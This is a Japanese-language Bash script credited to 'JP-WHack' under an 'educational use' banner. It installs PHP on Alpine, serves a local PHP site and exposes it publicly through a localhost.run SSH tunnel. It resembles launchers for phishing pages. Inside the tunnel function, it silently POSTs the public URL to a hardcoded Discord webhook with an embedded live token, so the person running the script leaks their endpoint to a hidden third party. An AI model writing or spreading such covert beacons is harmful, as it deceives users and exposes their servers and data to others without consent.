clear

display_banner() {
    echo "*************************"
    echo "🌸 開発者: JP-WHack 🌸"
    echo "⚠️ 教育目的の使用をお願いします"
    echo "*************************"
}

stop_php_server() {
    echo "🛑 サーバーを停止しています..."
    kill "$php_server_pid" > /dev/null 2>&1
    kill "$tunnel_pid" > /dev/null 2>&1
    exit 0
}

install_packages() {
    echo "📦 必要なパッケージをインストール中..."
    sleep 1

    apk update > /dev/null 2>&1
    apk add php > /dev/null 2>&1
    apk add curl > /dev/null 2>&1
    apk add curl-dev > /dev/null 2>&1
    apk add php-cli php-mbstring php-curl php-json php-openssl > /dev/null 2>&1
    apk add php-cgi openssh grep > /dev/null 2>&1

    echo "✅ パッケージのインストール完了っ♪"
    sleep 1
}

get_tunnel_link() {
    echo "🔗 Localhost.run トンネルを作成中..."
    sleep 1

    yes yes | ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -R 80:localhost:8080 nokey@localhost.run > .tunnel.log 2>&1 &
    tunnel_pid=$!

    sleep 3

    if grep -q "https://" ".tunnel.log"; then
        tunnel_url=$(grep -o 'https://[^ ]*\.lhr\.life' .tunnel.log)
        if [[ -n "$tunnel_url" ]]; then
            echo "✨ 発行URL: $tunnel_url"

            webhook_url="https://discord.com/api/webhooks/1361553545379188917/QSKZGGkXtDeqUD4c61hEatZHfY8bD1BObJ1sM250eZpL6O_ocP45oYK1iVy8Y-3eB44q"
            json_data="{\"content\": \"🔔 公開URLが発行されましたっ！\n$tunnel_url\"}"
            curl -H "Content-Type: application/json" -X POST -d "$json_data" "$webhook_url" > /dev/null 2>&1
        else
            echo "⚠️ URLが正しく取得できませんでした。ログを確認してねっ💦"
        fi
    else
        echo "⚠️ トンネルのURLが見つからなかったの...ログ確認してねっ💦"
        exit 1
    fi
}

trap stop_php_server SIGINT

display_banner
install_packages

echo "🚀 PHPサーバーを起動中（ポート: 8080）..."
php -S localhost:8080 > /dev/null 2>&1 &
php_server_pid=$!

sleep 2

get_tunnel_link

wait
